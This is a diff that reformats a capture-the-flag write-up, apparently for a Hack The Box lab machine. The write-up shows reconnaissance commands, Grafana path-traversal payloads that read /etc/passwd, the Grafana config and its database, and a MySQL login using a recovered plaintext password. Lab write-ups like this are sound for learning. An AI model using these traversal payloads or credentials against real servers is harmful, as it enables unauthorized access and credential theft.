@@ -2,7 +2,7 @@
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-#### **Port scan:**
+#### Port scan:
 
 Started with the quck rustscan for port scanning & found 4 open ports :
 
@@ -115,8 +115,10 @@ In the post it's mentioned that "Connecting to this machine Use the developer ac
 
 I ran the go buster against the web server but didn't get any useful subdirectory.
 
-        gobuster dir -u http://10.10.11.183 -t 20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o amb_web -b 404,403 -k
-        
+```bash
+gobuster dir -u http://10.10.11.183 -t 20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o amb_web -b 404,403 -k
+```      
+
 ![image](https://user-images.githubusercontent.com/87700008/210258728-0c2c07f2-5aba-43ef-b56b-19d88848776c.png)
 
 On the image sub-directory "http://10.10.11.183/images/" there is 1 image present, so I downloaded it check for the metadata but didn't get any useful info.
@@ -196,20 +198,26 @@ So I fired up my burp & started intercepting the request. And landed onto this p
 
 I supplied the payload from the blog to read the '/etc/passwd' directory & it worked.
 
-        /public/plugins/alertlist/../../../../../../../../etc/passwd
-        
+```bash
+/public/plugins/alertlist/../../../../../../../../etc/passwd
+```
+
 ![image](https://user-images.githubusercontent.com/87700008/210263915-7bf620ec-1285-4c09-96a4-54132f4e8eb8.png)
 
 Next, I supplied below payload & got the data of Grafana configuration file :
 
-        /public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini
-        
+```bash
+/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini
+```
+
 ![image](https://user-images.githubusercontent.com/87700008/210264473-a5e89831-016d-4ae1-9576-bbda60210551.png)
 
 Next, I got hold on the Grafana DB :
 
-        /public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db
-        
+```bash
+/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db
+```
+
 ![image](https://user-images.githubusercontent.com/87700008/210264641-4c1c16aa-e8fd-4b33-bd04-9bfe5b7cbb5b.png)
 
 Then after extracting all the sensitive files I dived into the Grafana configuration first & got the admin password in it.
@@ -234,9 +242,11 @@ I used that credentials to login with SSH but no luck here as well. 😕
 
 I then tried the credentials to login into mysql server as the port 3306 is open & mysql is running. 
 
-        mysql -u grafana -p'dontStandSoCloseToMe63221!' -h 10.10.11.183 -P 3306
+```bash
+mysql -u grafana -p'dontStandSoCloseToMe63221!' -h 10.10.11.183 -P 3306
+```
 
-Logged in successfully & found that there is a database present 'whackywidget' which contains developer credentials.
+Logged in successfully & found that there is a database present '**whackywidget**' which contains developer credentials.
 
 ![image](https://user-images.githubusercontent.com/87700008/210395611-66e69654-251c-40f2-8626-3bcdf4c59667.png)
 
